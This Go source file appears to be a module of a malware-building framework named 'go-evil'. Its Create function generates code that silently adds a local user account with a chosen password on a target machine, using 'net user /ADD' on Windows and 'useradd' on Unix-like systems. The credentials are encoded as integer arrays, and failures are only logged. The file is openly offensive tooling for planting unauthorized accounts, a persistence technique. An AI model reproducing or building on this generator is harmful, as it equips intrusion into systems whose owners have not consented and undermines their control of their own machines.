package users

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure"
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Creates a user on the local machine
// Input, an evil array in the following format ${"username", "password"}$
func Create(value string, data_object *json.Json_t) []string {
	function_call := "create_user"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.create_user()")
	}

	body := []string{
		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"param_2 := spine.variable.get(spine.alpha.construct_string(repr_2))",
		"command := \"\"",
	}

	switch data_object.Target_os {
	case "windows":
		body = append(body, "command = fmt.Sprintf(\"net user %s %s /ADD\", param_1, param_2)")

	default: // nix systems
		body = append(body, "command = fmt.Sprintf(\"useradd -p %s %s\", param_2, param_1)")
	}

	body = append(body, []string{
		"split_command := strings.Split(command, \" \")",
		"cmd := exec.Command(split_command[0], split_command[1:]...)",
		"_, err := cmd.CombinedOutput()",
		"if err != nil {",
		"spine.log(err.Error())",
		"}"}...)

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int", "repr_2 []int"},
		Gut:        body})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("strings")

	parameter_1 := data_object.Generate_int_array_parameter(arr.Get(0))
	parameter_2 := data_object.Generate_int_array_parameter(arr.Get(1))

	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_1, parameter_2)}
}
